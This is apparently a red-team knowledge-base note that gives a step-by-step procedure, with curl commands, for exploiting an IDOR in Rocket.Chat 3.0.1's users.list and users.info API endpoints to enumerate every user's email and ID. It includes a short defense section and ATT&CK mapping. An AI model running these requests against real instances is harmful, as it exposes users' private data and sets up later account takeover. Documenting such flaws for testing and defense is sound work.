---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567891
tags:
  - idor
  - user-enumeration
  - rocket-chat
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-users-list]]'
  - '[[commands/curl-users-info]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:33:24.546Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Enumerate Users via IDOR in Rocket.Chat

## Summary

This procedure exploits an IDOR vulnerability in Rocket.Chat 3.0.1's /api/v1/users.list and /api/v1/users.info endpoints, allowing any authenticated user to retrieve details of all users, including emails and other sensitive info, without authorization checks.

## Description

In Rocket.Chat 3.0.1, the API endpoints for user listing and info retrieval do not enforce proper object-level authorization. A low-privileged user can query any userId to access private data like emails, which are normally protected. This is discovered by authenticating as a regular user and directly calling the endpoints. The target environment is a web-based Rocket.Chat instance with LDAP auth on Node.js.

## Requirements

1. Valid LDAP credentials with 'user' role
2. Network access to the Rocket.Chat API (HTTPS)
3. API authentication token and user ID from login session

## Defense

Defensive measures and detection strategies:

- Implement proper authorization checks on API endpoints to restrict access to own user data only
- Enable API rate limiting and logging for user enumeration attempts
- Use role-based access control (RBAC) to prevent low-priv users from querying others

## Objectives

1. Discover target users and their emails
2. Extract user _id for further exploitation
3. Gather sensitive info like reset hashes later in chain

## Instructions

### Step 1: Authenticate to Rocket.Chat

**Context**: Obtain session tokens needed for authenticated API calls.

**Command** ([[commands/rocket-chat-login]]):
```bash
# Typically via browser or POST to /api/v1/login
curl -X POST https://target/api/v1/login -d '{"user": "attacker@ldap", "password": "pass"}'
```

> Returns X-Auth-Token and X-User-Id in response headers/cookies. Use these in subsequent requests.

### Step 2: List All Users

**Context**: Fetch the full user list to identify targets.

**Command** ([[commands/curl-users-list]]):
```bash
curl -H "X-Auth-Token: YOUR_TOKEN" -H "X-User-Id: YOUR_ID" https://target/api/v1/users.list
```

> JSON response with array of users, each containing _id, username, email. Copy target's _id.

### Step 3: Retrieve Specific User Info

**Context**: Get detailed info for the target using their _id.

**Command** ([[commands/curl-users-info]]):
```bash
curl -H "X-Auth-Token: YOUR_TOKEN" -H "X-User-Id: YOUR_ID" "https://target/api/v1/users.info?userId=TARGET_ID"
```

> Returns user object with email and other details. Success if no 403 error.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-users-list]]
- [[commands/curl-users-info]]

## Tools Used


## Tags

- idor
- enumeration
